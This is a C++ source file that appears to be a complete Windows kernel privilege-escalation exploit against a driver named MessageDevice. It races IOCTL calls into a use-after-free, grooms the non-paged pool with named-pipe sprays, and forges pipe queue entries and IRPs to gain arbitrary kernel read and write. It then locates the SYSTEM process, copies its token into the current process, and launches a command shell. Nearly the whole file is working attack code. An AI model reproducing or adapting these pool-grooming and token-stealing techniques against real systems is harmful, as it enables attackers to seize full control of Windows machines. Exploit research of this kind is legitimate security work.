#include "Header.hpp"
#include "Hexdump.hpp"
#include <vector>
#include <time.h>

#define STATUS_UNSUCCESSFUL 0xC0000001


#define DEVICE_NAME "\\\\.\\MessageDevice"

// Msg entry size
#define MSG_SIZE_SMALL 0x20
#define MSG_SIZE_BIG_MIN  0x200
#define MSG_SIZE_BIG_MAX 0x3000 - 0xC

// Thread count and entry count for race
//#define PAD_MSG_ENTRY_COUNT 0x10000
#define FLIPPING_MSG_ENTRY_COUNT 0x500
#define FLIPPING_THREAD_COUNT 5
#define WAIT_TIME_RACE_CONFIRM 1000
#define MAX_TRIAL 50

// Pool spray config
#define NP_SPRAY_COUNT 0x1900
#define NP_HOLE_COUNT 0x600
#define NP_RECLAIM_COUNT 0x1500

#define POOL_BLOCK_SIZE 0x70
#define NP_HEADER_SIZE 0x30

#define NP_BUFFERED_TAIL_ENTRY_SIZE 0x50
#define NP_BUFFERED_HEAD_ENTRY_SIZE POOL_BLOCK_SIZE - NP_HEADER_SIZE
#define NP_UNBUFFERED_ENTRY_SIZE POOL_BLOCK_SIZE

// just a large enough number, one that fits all types of pipes
#define NP_TOTAL_DATA_SIZE NP_UNBUFFERED_ENTRY_SIZE + NP_BUFFERED_HEAD_ENTRY_SIZE + NP_BUFFERED_TAIL_ENTRY_SIZE	

#define USERMODE_FAKE_TMSG_REFCOUNT 0x69696969
#define KERNELMODE_FAKE_DQE_MAGIC 0x1234567812345678

#define EPROCESS_THREADLISTHEAD_OFFSET 0x5e0
#define EPROCESS_PID_OFFSET 0x440
#define EPROCESS_TOKEN_OFFSET 0x4b8
#define EPROCESS_PROCESSLINK_OFFSET 0x448



typedef struct __declspec(align(8)) TMsg
{
	long refCount;
	int pad;
	LIST_ENTRY listEntry;
	__int64 msgContent;
	__int64 msgSize;
	FAST_MUTEX mutex;
	char isAddedToBucket;
} TMsg;

#pragma pack(1)		// Prevent padding
struct WriteMsg {
	int index;
	QWORD msgSize;
	char content[];
};

bool isRaceSuccess = false;
HANDLE generalDevice;
HANDLE emptyDevice;
HANDLE raceDeviceList[FLIPPING_THREAD_COUNT];
HANDLE bigBucketEmtpyThread, smallBucketEmptyThread;
HANDLE watchRefCountThread;

DWORD flippingIndexList[FLIPPING_MSG_ENTRY_COUNT]; // using array instead of vector for increased speed

//std::vector<PIPE_HANDLES> sprayPipeList, holePipeList, reclaimPipeUnbufferedList, reclaimPipeBufferedList;
PIPE_HANDLES sprayPipeList[NP_SPRAY_COUNT];
PIPE_HANDLES holePipeList[NP_HOLE_COUNT];
PIPE_HANDLES reclaimPipeUnbufferedListStage1[NP_RECLAIM_COUNT];
PIPE_HANDLES reclaimPipeUnbufferedListStage3[NP_RECLAIM_COUNT];
PIPE_HANDLES reclaimPipeBufferedList[NP_RECLAIM_COUNT];


NTFSCONTROLFILE NtFsControlFile;

TMsg* fakeUsermodeTmsg;
bool isKernelThreadTrapped = false;

PIPE_HANDLES g_vulnPipe;
DATA_QUEUE_ENTRY* g_usermodeDqe;


DWORD addMsg() {
	int index;
	DeviceIoControl(generalDevice, 0x222000, NULL, 0, &index, sizeof(index), NULL, NULL);
	return index;
}

void deleteMsg(int index) {
	DeviceIoControl(generalDevice, 0x222004, &index, sizeof(index), NULL, 0, NULL, NULL);
}

void emptyBucket(int bucket) {
	DeviceIoControl(generalDevice, 0x22200C, &bucket, sizeof(bucket), NULL, 0, NULL, NULL);
}

void writeMsg(int index, QWORD size) {
	WriteMsg* smallMsg = (WriteMsg*)malloc(size + 0xc);
	smallMsg->index = index;
	smallMsg->msgSize = size;
	DeviceIoControl(generalDevice, 0x222008, smallMsg, size + 0xc, NULL, 0, NULL, NULL);
	free(smallMsg);
}

DWORD addSmallEntry(QWORD size = MSG_SIZE_SMALL) {
	int index = addMsg();
	writeMsg(index, size);
	return index;
}

DWORD addBigEntry(QWORD size = MSG_SIZE_BIG_MIN) {
	int index = addMsg();
	writeMsg(index, size);
	return index;
}

DWORD WINAPI emptyBucketThread(LPVOID lpParameter) {
	DeviceIoControl(emptyDevice, 0x22200C, &lpParameter, sizeof(int), NULL, 0, NULL, NULL);
	//printf("Done empty: %d\n", (int)lpParameter);
	return 0;
}

DWORD WINAPI writeSmallMsgThread(LPVOID lpParameter) {
	//puts("[*] Start write");	// This line alone seems to cause some timing issue
	int startIndex = (int)lpParameter;
	HANDLE device = raceDeviceList[startIndex];

	WriteMsg* smallMsg = (WriteMsg*)malloc(MSG_SIZE_SMALL + 0xc);
	smallMsg->msgSize = MSG_SIZE_SMALL;
	for (int i = startIndex; i < FLIPPING_MSG_ENTRY_COUNT; i += FLIPPING_THREAD_COUNT) {
		smallMsg->index = flippingIndexList[i];
		DeviceIoControl(device, 0x222008, smallMsg, MSG_SIZE_SMALL + 0xc, NULL, 0, NULL, NULL);
	}
	free(smallMsg);
	//puts("[*] End write");
	return 0;
}

void initPipeList(PIPE_HANDLES pipeList[], int size, bool isNonBlocking = false) {
	HANDLE r, w;
	QWORD overlapFlag = isNonBlocking ? FILE_FLAG_OVERLAPPED : 0;
	for (int i = 0; i < size; i++) {
		w = CreateNamedPipeA(PIPE_NAME_1, PIPE_ACCESS_OUTBOUND | overlapFlag, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, NP_TOTAL_DATA_SIZE, 0, 0, NULL);
		r = CreateFileA(PIPE_NAME_1, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
		if (r == NULL || w == NULL) {
			puts("Failed to create pipe");
			continue;
		}
		pipeList[i] = { r, w };
	}
}

void initPipes() {

	// Create pipes for spraying
	initPipeList(sprayPipeList, NP_SPRAY_COUNT);
	initPipeList(holePipeList, NP_HOLE_COUNT);
	initPipeList(reclaimPipeUnbufferedListStage1, NP_RECLAIM_COUNT, true);
	initPipeList(reclaimPipeBufferedList, NP_RECLAIM_COUNT, true);
	initPipeList(reclaimPipeUnbufferedListStage3, NP_RECLAIM_COUNT, true);
}

void cleanupPipeList(PIPE_HANDLES pipeList[], int size) {
	HANDLE r, w;
	for (int i = 0; i < size; i++) {
		r = pipeList[i].Read;
		w = pipeList[i].Write;
		CloseHandle(r);
		CloseHandle(w);
		pipeList[i] = { NULL, NULL };
	}
	//pipeList.clear();
}

void cleanupPipes() {
	cleanupPipeList(sprayPipeList, NP_SPRAY_COUNT);
	cleanupPipeList(holePipeList, NP_HOLE_COUNT);
	cleanupPipeList(reclaimPipeUnbufferedListStage1, NP_RECLAIM_COUNT);
	cleanupPipeList(reclaimPipeBufferedList, NP_RECLAIM_COUNT);
	cleanupPipeList(reclaimPipeUnbufferedListStage3, NP_RECLAIM_COUNT);
}

DWORD WINAPI watchTmsgRefCount(LPVOID lpParameter) {
	while (true) {
		if (!isKernelThreadTrapped && fakeUsermodeTmsg->refCount != USERMODE_FAKE_TMSG_REFCOUNT) {
			puts("[*] Kernel loop redirected to usermode");
			isKernelThreadTrapped = true;
		}
		fakeUsermodeTmsg->refCount = USERMODE_FAKE_TMSG_REFCOUNT;
	}
}

void initUserModeTmsg() {
	fakeUsermodeTmsg = (TMsg*)VirtualAlloc(NULL, sizeof(TMsg), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	printf("[*] Fake user Tmsg crated at: 0x%p\n", fakeUsermodeTmsg);
	memset(fakeUsermodeTmsg, 0, sizeof(TMsg));
	fakeUsermodeTmsg->refCount = USERMODE_FAKE_TMSG_REFCOUNT;
	fakeUsermodeTmsg->listEntry.Flink = &fakeUsermodeTmsg->listEntry;
	fakeUsermodeTmsg->listEntry.Blink = &fakeUsermodeTmsg->listEntry;
	watchRefCountThread = CreateThread(NULL, 0, watchTmsgRefCount, NULL, NULL, NULL);
	SetThreadPriority(watchRefCountThread, THREAD_PRIORITY_TIME_CRITICAL);

}

void initUserModeDQE() {
	g_usermodeDqe = (DATA_QUEUE_ENTRY*)VirtualAlloc(NULL, sizeof(DATA_QUEUE_ENTRY), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	IRP* irp = (IRP*)VirtualAlloc(NULL, sizeof(IRP), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	printf("[*] Fake DATA_QUEUE_ENTRY at: 0x%p\n", g_usermodeDqe);
	printf("[*] Usermode IRP at: 0x%p\n", irp);
	memset(g_usermodeDqe, 0, sizeof(DATA_QUEUE_ENTRY));
	g_usermodeDqe->Irp = irp;
	g_usermodeDqe->SecurityContext = 0;
	g_usermodeDqe->EntryType = 1;
	g_usermodeDqe->QuotaInEntry = 0;
	g_usermodeDqe->DataSize = 0x100;  // will be fixed later when arbitrary read
}

void arbitraryRead(PVOID64 addr, size_t size, PVOID result) {
	//printf("[*] Reading: 0x%I64x\n", addr);
	if (!g_vulnPipe.Read) {
		puts("[!] No corrupted pipe");
		return;
	}

	*(PVOID64*)((char*)g_usermodeDqe->Irp + 0x18) = addr; // SystemBuffer
	g_usermodeDqe->SecurityContext = 0;
	g_usermodeDqe->EntryType = 1;
	g_usermodeDqe->QuotaInEntry = 0;
	g_usermodeDqe->DataSize = size;
	size_t bufSize = NP_BUFFERED_HEAD_ENTRY_SIZE + size;
	char* tempBuf = (char*)malloc(bufSize);

	PeekNamedPipe(g_vulnPipe.Read, tempBuf, bufSize, NULL, NULL, NULL);
	memcpy(result, &tempBuf[bufSize - size], size);
	free(tempBuf);
}

DWORD WINAPI ThreadedWriter(void* arg) {
	// Create an extra entry, making the pipe quota exceed to declared amount
	char* buf[NP_TOTAL_DATA_SIZE];
	DWORD res;
	WriteFile(g_vulnPipe.Write, buf, NP_TOTAL_DATA_SIZE, &res, NULL);
	Sleep(-1);
	return 0;
}

void prepareWriteIRP(IRP* irp, uint64_t thread_list, uint64_t source_address, uint64_t destination_address) {
	irp->Flags = 0x60850;
	irp->AssociatedIrp.SystemBuffer = (PVOID)source_address;
	irp->UserBuffer = (PVOID)destination_address;
	irp->ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list);
	irp->ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);
}

void prepareDqeForWrite(uint64_t irp, uint32_t size) {
	g_usermodeDqe->EntryType = 0;
	g_usermodeDqe->DataSize = size;
	g_usermodeDqe->QuotaInEntry = size - 1;
	g_usermodeDqe->Irp = (IRP * __ptr64)irp;
}

uint64_t findEProcessById(uint64_t eProc, uint64_t targetPid) {
	// eProc is a known address of an EPROCESS
	uint64_t currentEProc, currentPid;
	currentEProc = eProc;
	while (true) {
		arbitraryRead((PVOID64)(currentEProc + EPROCESS_PID_OFFSET), 8, &currentPid);
		if (currentPid == targetPid) {
			return currentEProc;
		}
		arbitraryRead((PVOID64)(currentEProc + EPROCESS_PROCESSLINK_OFFSET), 8, &currentEProc);
		currentEProc -= EPROCESS_PROCESSLINK_OFFSET;
		if (currentEProc == eProc) {
			return 0;
		}
	}
}

void shapePoolLayout() {
	int holePipeCounter = 0;
	char* pipeContent = (char*)malloc(NP_BUFFERED_HEAD_ENTRY_SIZE);
	memset(pipeContent, 0x41, NP_BUFFERED_HEAD_ENTRY_SIZE);
	//bool stat;
	for (int i = 0; i < NP_SPRAY_COUNT; i++) {
		WriteFile(sprayPipeList[i].Write, pipeContent, NP_BUFFERED_HEAD_ENTRY_SIZE, NULL, 0);
		//printf("%d\n", stat);
		if (i > 0x700 && i < NP_SPRAY_COUNT - 10 && holePipeCounter < NP_HOLE_COUNT) {
			WriteFile(holePipeList[holePipeCounter].Write, pipeContent, NP_BUFFERED_HEAD_ENTRY_SIZE, NULL, 0);
			//printf("%d\n", stat);
			holePipeCounter++;
		}
	}
	// Poke holes
	for (auto& p : holePipeList) {
		ReadFile(p.Read, pipeContent, NP_BUFFERED_HEAD_ENTRY_SIZE, 0, 0);
	}

}

void reclaimHoleStage1() {
	// 1st spray with unbuffered entries to reclaim the corrupted Message entry object
	// The unbuffered entries acts as a fake Tmsg, with Flink pointing to our usermode fake Tmsg
	// Its refCount == 1 so that it will be freed right after the loop moved to usermode
	//TMsg* pipeContent = (TMsg*)malloc(NP_UNBUFFERED_ENTRY_SIZE);
	char pipeContent[NP_UNBUFFERED_ENTRY_SIZE];
	memset(pipeContent, 0, NP_UNBUFFERED_ENTRY_SIZE);
	TMsg* fakeTmsg = (TMsg*)pipeContent;
	fakeTmsg->refCount = 1;
	fakeTmsg->listEntry.Flink = &fakeUsermodeTmsg->listEntry;
	fakeTmsg->listEntry.Blink = &fakeUsermodeTmsg->listEntry;

	IO_STATUS_BLOCK isb;
	for (int i = 0; i < NP_RECLAIM_COUNT; i++) {
		NtFsControlFile(reclaimPipeUnbufferedListStage1[i].Write, 0, 0, 0, &isb, 0x119FF8, pipeContent, NP_UNBUFFERED_ENTRY_SIZE, 0, 0);
	}
} 

void reclaimHoleStage2() {
	// Reclaim the hole after the unbuffered entry from stage 1 is freed by the empty loop
	char pipeContent[NP_BUFFERED_HEAD_ENTRY_SIZE + NP_BUFFERED_TAIL_ENTRY_SIZE];
	//memset(pipeContent, 0x43, NP_BUFFERED_HEAD_ENTRY_SIZE);
	for (int i = 0; i < NP_RECLAIM_COUNT; i++) {
		WriteFile(reclaimPipeBufferedList[i].Write, pipeContent, NP_BUFFERED_HEAD_ENTRY_SIZE, NULL, 0);
	}

	// Add another entry at the tail before corruption so that we can still add more entry after corruption with InsertTailList
	for (int i = 0; i < NP_RECLAIM_COUNT; i++) {
		WriteFile(reclaimPipeBufferedList[i].Write, pipeContent, NP_BUFFERED_TAIL_ENTRY_SIZE, NULL, 0);
		//printf("%d\n", stat);
	}
}

void reclaimHoleStage3(char pipeContent[], int size = NP_UNBUFFERED_ENTRY_SIZE) {
	// Reclaimed the hole left by the buffered entry in stage 2
	// pipeContent is a fake DQE for arbitrary read, should be forged outside
	IO_STATUS_BLOCK isb;
	for (int i = 0; i < NP_RECLAIM_COUNT; i++) {
		NTSTATUS status = NtFsControlFile(reclaimPipeUnbufferedListStage3[i].Write, 0, 0, 0, &isb, 0x119FF8, pipeContent, NP_UNBUFFERED_ENTRY_SIZE, 0, 0);
		//printf("Status: 0x%x\n", status);
	}
}

bool detectCorruptPipe() {
	char leakContent[NP_BUFFERED_HEAD_ENTRY_SIZE];
	for (int i = 0; i < NP_RECLAIM_COUNT; i++) {
		PeekNamedPipe(reclaimPipeBufferedList[i].Read, &leakContent, NP_BUFFERED_HEAD_ENTRY_SIZE, NULL, NULL, NULL);
		if (*(QWORD*)leakContent == KERNELMODE_FAKE_DQE_MAGIC) {
			printf("[*] Found magic sequence: 0x%llx\n", *(QWORD*)leakContent);
			g_vulnPipe = reclaimPipeBufferedList[i];
			return true;
		}
	}
	return false;
}

void exploitUAF() {
	char pipeData[NP_TOTAL_DATA_SIZE];
	TMsg kernelFakeTmsg;
	PIPE_HANDLES corruptReclaimPipe{ NULL, NULL };
	DATA_QUEUE_ENTRY* originalBufferedDqe = NULL;
	NP_CCB *corruptPipeCCB = NULL;

	DATA_QUEUE_ENTRY *currentEntryAddr, *tailEntryAddr;

	reclaimHoleStage1();
	//reclaimHoleStage3();
	printf("[*] 1st spray done: %d unbuffered DQE\n", NP_RECLAIM_COUNT);
	// Since unbuffered entries can only be sprayed in non-blocking mode
	// We should wait a bit for the empty loop to actually move to usermode
	Sleep(200);	

	if (!isKernelThreadTrapped) {
		//puts("[!] Failed to reclaim hole. BSOD incoming :(");
		puts("[!] Race failed");
		return;
	}
	reclaimHoleStage2();
	printf("[*] 2nd spray done: %d buffered DQE\n", NP_RECLAIM_COUNT);

	for (int i = 0; i < NP_SPRAY_COUNT; i++) {
		PeekNamedPipe(reclaimPipeUnbufferedListStage1[i].Read, &kernelFakeTmsg, sizeof(TMsg), NULL, NULL, NULL);
		if (kernelFakeTmsg.listEntry.Flink != &fakeUsermodeTmsg->listEntry) {
			puts("[*] Found corrupted stage 1 pipe. Leaking buffered DQE");
			corruptReclaimPipe = reclaimPipeUnbufferedListStage1[i];
			//std::cout << Hexdump(&kernelFakeTmsg, sizeof(kernelFakeTmsg)) << std::endl;
			originalBufferedDqe = (DATA_QUEUE_ENTRY*)&kernelFakeTmsg;
			// Since this is the 1st entry in this pipe, its Blink points to CCB
			corruptPipeCCB = (NP_CCB*)(originalBufferedDqe->Blink - offsetof(NP_CCB, DataQueueOutbound));
			printf("[*] Corrupt pipe's CCB: 0x%p\n", corruptPipeCCB);
			break;
		}
	}
	if (corruptReclaimPipe.Read == NULL) {
		puts("[!] Can't find reclaim pipe");
		getchar();
		return;
	}

	// Forging the fake buffered DQE
	char stage3Content[NP_UNBUFFERED_ENTRY_SIZE];
	ZeroMemory(stage3Content, NP_UNBUFFERED_ENTRY_SIZE);
	DATA_QUEUE_ENTRY* fakeKernelDQE = (DATA_QUEUE_ENTRY*)stage3Content;
	fakeKernelDQE->Flink = (uint64_t)g_usermodeDqe;
	fakeKernelDQE->Blink = 0;
	fakeKernelDQE->Irp = NULL;
	fakeKernelDQE->EntryType = 0;
	fakeKernelDQE->QuotaInEntry = NP_BUFFERED_HEAD_ENTRY_SIZE;
	fakeKernelDQE->DataSize = NP_BUFFERED_HEAD_ENTRY_SIZE;	// keeping old size, since we don't need relative read
	*(QWORD*)(fakeKernelDQE + 1) = KERNELMODE_FAKE_DQE_MAGIC;

	// Free the targeted spot, reclaim with unbuffered entries
	ReadFile(corruptReclaimPipe.Read, pipeData, NP_UNBUFFERED_ENTRY_SIZE, NULL, NULL);
	reclaimHoleStage3(stage3Content, NP_UNBUFFERED_ENTRY_SIZE);
	Sleep(200);
	printf("[*] 3rd spray done: %d unbuffered DQE\n", NP_RECLAIM_COUNT);

	bool hasCorruptPipe = detectCorruptPipe();
	if (hasCorruptPipe) {
		printf("[*] Corrupted pipe handle: r: %x - w: %x\n", g_vulnPipe.Read, g_vulnPipe.Write);
	}
	else {
		puts("[!] Can't find corrupted pipe");
	}

	QWORD temp;
	arbitraryRead((PVOID64)(&corruptPipeCCB->DataQueueOutbound.Queue.Blink), 8, &temp);
	tailEntryAddr = (DATA_QUEUE_ENTRY*)(temp - offsetof(DATA_QUEUE_ENTRY, Flink));
	printf("[*] Tail entry address: 0x%p\n", tailEntryAddr);

	arbitraryRead((PVOID64)(&corruptPipeCCB->DataQueueOutbound.Queue.Flink), 8, &temp);
	currentEntryAddr = (DATA_QUEUE_ENTRY*)(temp - offsetof(DATA_QUEUE_ENTRY, Flink));
	printf("[*] Current entry address: 0x%p\n", currentEntryAddr);

	CreateThread(0, 0, ThreadedWriter, NULL, 0, 0);
	Sleep(2000);

	uint64_t stalledWriteEntry, validIrpAddr;
	arbitraryRead(&tailEntryAddr->Flink, 8, &stalledWriteEntry);
	arbitraryRead((PVOID64)(stalledWriteEntry + offsetof(DATA_QUEUE_ENTRY, Irp)), 8, &validIrpAddr);
	printf("[*] Real IRP created at: 0x%p\n", validIrpAddr);

	char irpData[0x100];
	arbitraryRead((PVOID64)validIrpAddr, 0x100, irpData);
	//std::cout << Hexdump(irpData, sizeof(IRP)) << std::endl;

	uint64_t threadListHead, currentEProcess, systemEProcess;
	// Calculate _ETHREAD.ThreadListEntry from _ETHREAD.IrpList
	// IRP belongs to the last thread created, so _ETHREAD.ThreadListEntry.Flink points to ThreadListHead in EProcess
	arbitraryRead((PVOID64)(*(uint64_t*)(&irpData[0x20]) + 0x38), 8, &threadListHead);
	currentEProcess = threadListHead - EPROCESS_THREADLISTHEAD_OFFSET;
	printf("[*] Leaked current EPROCESS: 0x%p\n", currentEProcess);
	systemEProcess = findEProcessById(currentEProcess, 4);
	printf("[*] Leaked SYSTEM EPROCESS: 0x%p\n", systemEProcess);

	puts("[*] Crafting fake IRP");
	uint64_t thread_list[2];
	IO_STATUS_BLOCK isb;
	prepareWriteIRP((IRP*)irpData, (uint64_t)thread_list, systemEProcess + EPROCESS_TOKEN_OFFSET, currentEProcess + EPROCESS_TOKEN_OFFSET);
	NtFsControlFile(g_vulnPipe.Write, 0, 0, 0, &isb, 0x119FF8, irpData, 0x1000, 0, 0);

	uint64_t containerEntryAddr, containerIrpAddr, fakeIrpAddr;
	arbitraryRead((PVOID64)stalledWriteEntry, 8, &containerEntryAddr);  // New entry created at the end of the list
	arbitraryRead((PVOID64)(containerEntryAddr + offsetof(DATA_QUEUE_ENTRY, Irp)), 8, &containerIrpAddr);
	arbitraryRead((PVOID64)(containerIrpAddr + 0x18), 8, &fakeIrpAddr);
	printf("[*] Fake IRP at: 0x%p\n", fakeIrpAddr);

	prepareDqeForWrite(fakeIrpAddr, 8);
	thread_list[0] = thread_list[1] = fakeIrpAddr + 0x20;
	puts("[*] Trigger arbitrary write, swapping tokens");
	DWORD byteRead;
	ReadFile(g_vulnPipe.Read, pipeData, 1, &byteRead, 0);
	Sleep(200);

	puts("[*] Done");
	system("cmd");

	getchar();
	
}

void triggerRace() {

	HANDLE flippingThreadList[FLIPPING_THREAD_COUNT];
	int dummyEntryList[FLIPPING_MSG_ENTRY_COUNT];

	// Create dummy entries
	for (int i = 0; i < FLIPPING_MSG_ENTRY_COUNT; i++) {
		dummyEntryList[i] = addMsg();
	}

	initPipes();
	shapePoolLayout();
	puts("[*] Pool layout set");

	for (int i = 0; i < FLIPPING_MSG_ENTRY_COUNT; i++) {
		writeMsg(dummyEntryList[i], MSG_SIZE_BIG_MAX);
		//int tmp = addBigEntry(MSG_SIZE_BIG_MAX);
		deleteMsg(dummyEntryList[i]);
		flippingIndexList[i] = addBigEntry(MSG_SIZE_BIG_MIN);
	}
	//getchar();
	bigBucketEmtpyThread = CreateThread(NULL, 0, emptyBucketThread, (LPVOID)1, CREATE_SUSPENDED, NULL);
	SetThreadPriority(bigBucketEmtpyThread, THREAD_PRIORITY_BELOW_NORMAL);
	SetThreadAffinityMask(bigBucketEmtpyThread, 1 << FLIPPING_THREAD_COUNT);

	for (int i = 0; i < FLIPPING_THREAD_COUNT; i++) {
		flippingThreadList[i] = CreateThread(NULL, 0, writeSmallMsgThread, (LPVOID)i, CREATE_SUSPENDED, NULL);
		SetThreadPriority(flippingThreadList[i], THREAD_PRIORITY_HIGHEST);
		SetThreadAffinityMask(flippingThreadList[i], 1 << i);
	}
	puts("[*] Start race");

	ResumeThread(bigBucketEmtpyThread);
	for (int i = 0; i < FLIPPING_THREAD_COUNT; i++) {
		ResumeThread(flippingThreadList[i]);
	}

	DWORD waitStatus = WaitForSingleObject(bigBucketEmtpyThread, WAIT_TIME_RACE_CONFIRM);
	if (waitStatus == WAIT_TIMEOUT) {
		puts("[*] Race success. Empty thread trapped");
		//SuspendThread(bigBucketEmtpyThread); // Probably do nothing
		exploitUAF();
		isRaceSuccess = true;
		getchar();
	} else {
		puts("[*] Race failed. Cleaning up...");
		// Cleaning up. Preparing for next attempt
		for (int i = 0; i < FLIPPING_MSG_ENTRY_COUNT; i++) {
			deleteMsg(flippingIndexList[i]);
			flippingIndexList[i] = 0;
		}
		emptyBucket(0);
		emptyBucket(1);
		cleanupPipes();
	}
}

int main() {
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	SetThreadAffinityMask(GetCurrentThread(), 1 << FLIPPING_THREAD_COUNT);

	NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");

	// Init fake usermode structure
	initUserModeDQE();
	initUserModeTmsg();

	generalDevice = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	emptyDevice = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

	for (int i = 0; i < FLIPPING_THREAD_COUNT; i++) {
		raceDeviceList[i] = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	}

	puts("***********************************");
	for (int i = 0; i < MAX_TRIAL; i++) {
		printf("Trial %d\n", i);
		triggerRace();
		puts("***********************************");
		if (isRaceSuccess) break;
		Sleep(1000);
	}

	puts("[*] Done");
	getchar();
	cleanupPipes();
	TerminateThread(watchRefCountThread, 0);
}